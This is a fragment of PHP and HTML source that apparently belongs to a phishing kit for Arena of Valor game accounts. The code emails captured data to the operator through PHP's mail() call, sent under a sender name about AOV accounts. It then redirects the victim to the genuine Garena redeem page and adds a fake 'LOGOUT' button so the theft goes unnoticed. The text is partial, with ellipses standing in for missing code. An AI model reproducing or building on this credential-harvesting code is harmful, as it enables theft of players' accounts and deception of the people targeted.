...
$headers = "From: 𝕻𝖚𝖑𝖇𝖊𝖗𝕬𝖏𝖆 ᴀᴋᴜɴ ᴀᴏᴠ <Pulberaja.aov>";
mail($emailku, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r"));
?>
'<script>window.location.replace("https://aov.garena.co.id/redeem/")</script>';}
}
?>
<!-- ADHAN TAMVAN  !! -->
...
<div style="width:100%" class="form-group">
  ...
  <a  href="https://aov.garena.co.id/redeem/" class="btn btn-block" style="color: #F8F8FF;background-color: #000000;" id="gsubmit"> LOGOUT </a>			
